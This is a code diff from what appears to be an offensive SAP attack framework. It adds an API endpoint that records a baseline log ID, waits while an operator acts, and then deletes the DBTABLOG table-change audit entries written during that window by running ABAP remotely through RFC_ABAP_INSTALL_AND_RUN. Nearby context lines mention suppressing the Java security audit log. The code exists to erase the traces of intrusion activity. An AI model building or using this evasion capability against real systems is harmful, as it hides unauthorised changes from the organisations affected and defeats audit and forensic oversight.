@@ -7275,6 +7275,59 @@ def create_app(api: SAPMAPApi) -> Bottle:
              f"Tier 3: Java SAL suppress ({hold_seconds}s)", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/tier3_dbtablog_purge", method="POST")
+    def node_tier3_dbtablog_purge(sid):
+        """Tier 3 mutation — post-hoc purge of DBTABLOG entries written
+        during the hold window.  Captures MAX(LOGID) baseline, sleeps
+        hold_seconds (operator drives actions), then DELETEs entries
+        with LOGID > baseline via RFC_ABAP_INSTALL_AND_RUN.  No DDIC
+        touch, no DD09L mutation."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        if "ABAP" not in (node.system_type or "").upper():
+            return json.dumps({"error": f"{sid} is not an ABAP system"})
+        data = request.json or {}
+        try:
+            hold_seconds = float(data.get("hold_seconds") or 30.0)
+        except (TypeError, ValueError):
+            hold_seconds = 30.0
+        raw_tabs = data.get("tabname_filter") or []
+        if isinstance(raw_tabs, str):
+            raw_tabs = [t.strip() for t in raw_tabs.split(",")
+                        if t.strip()]
+        tabname_filter = [str(t).strip().upper() for t in raw_tabs
+                          if str(t).strip()]
+
+        def _run():
+            try:
+                from sapmap_evasion_tier3 import tier3_dbtablog_purge
+            except Exception as e:
+                print(f"[-] {sid}: tier3 dbtablog module unavailable: {e}")
+                return
+            scope = (f"tables={','.join(tabname_filter)}"
+                     if tabname_filter else "all tables")
+            print(f"[*] {sid}: Tier 3 DBTABLOG purge — "
+                  f"hold {hold_seconds}s, {scope}")
+            out = tier3_dbtablog_purge(api.state, node,
+                                         hold_seconds=hold_seconds,
+                                         tabname_filter=tabname_filter)
+            if not out.get("ok"):
+                print(f"[-] {sid}: DBTABLOG purge failed — "
+                      f"{out.get('error')}")
+                emit_finding("WARNING", sid,
+                              f"Tier 3 DBTABLOG purge failed: "
+                              f"{out.get('error')}")
+                return
+            print(f"[+] {sid}: DBTABLOG purge complete — "
+                  f"deleted {out.get('deleted_count', 0)} row(s) "
+                  f"(baseline={out.get('baseline_logid', '?')})")
+
+        _bg(f"{sid}:tier3_dbtablog_purge",
+             f"Tier 3: DBTABLOG purge ({hold_seconds}s)", _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/probe_rsau_dyn_profile", method="POST")
     def node_probe_rsau_dyn_profile(sid):
         """Phase 3 step 1 — read RSAU_API_GET_PROFILE for ID_NAME='$DYN$'
